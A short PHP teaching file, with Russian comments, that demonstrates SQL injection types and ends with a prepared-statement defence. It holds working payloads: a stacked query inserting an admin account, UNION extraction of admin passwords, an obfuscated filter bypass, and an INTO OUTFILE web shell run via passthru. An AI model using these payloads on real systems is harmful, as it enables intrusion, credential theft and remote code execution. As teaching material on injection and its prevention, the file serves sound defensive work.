<?php


// Опасность SQL-инъекций
/* Внедрение в строковые параметры */
// Запрос
$sql = "SELECT * FROM news WHERE title LIKE('%
$search_text%')";


// Инъекция
$search_text = "')+and+(author_id='1";

// Результат
$sql = "SELECT * FROM news WHERE title LIKE('%') AND
(author_id='1%')";


/* Расщепление запроса */
// Запрос
$sql = "SELECT * FROM news WHERE id = $id";
// Инъекция
$id = "12;INSERT INTO admin(login, password) VALUES('HaCkEr',
'1234')";


// Результат
$sql = "SELECT * FROM news WHERE id = 12;
INSERT INTO admin(login, password) VALUES('HaCkEr',
'1234')";



/* Иcпользование UNION */
// Запрос
$sql = "SELECT id, title, author, date FROM news WHERE id =
$id";


// Инъекция
$id = "-1 UNION SELECT 1, login, password, 1 FROM admin";
// Результат
$sql = "SELECT id, title, author, date FROM news WHERE id = -1
UNION SELECT 1, login, password, 1 FROM admin";


/* Экранирование хвоста запроса */
// Запрос
$sql = "SELECT title, author
FROM news WHERE cat = $id AND title LIKE('%
$search%')";


// Инъекция
$id = "-1 UNION SELECT login, password FROM admin--";
$id = "-1 U/**NI/**/ON SELECT login, password FROM admin--";
// Результат
$sql = "SELECT title, author FROM news WHERE cat = -1
UNION SELECT login, password FROM admin--
AND title LIKE('%$search%')";


// Запрос
$sql = "SELECT name FROM user WHERE id = $id";
// Инъекция
$id = "1+UNION+SELECT+'<?eval($_GET[cmd]);?>'
+INTO+OUTFILE+'/www/cmd.php'--";
// Исполнение скрипта
// http://example.com/cmd.php?cmd=passthru('ls')


// Подготовленные запросы
$sql = "INSERT INTO users(name, email, age) VALUES(?, ?, ?)";
// Уважаемый сервер, вот запрос - разбери его
$stmt = mysqli_prepare($link, $sql);
// Уважаемый сервер, вот параметры для запроса
mysqli_stmt_bind_param($stmt, "ssi", $name, $email, $age);
// А теперь, исполни подготовленный запрос с переданными
// параметрами
mysqli_stmt_execute($stmt);
mysqli_stmt_close($stmt);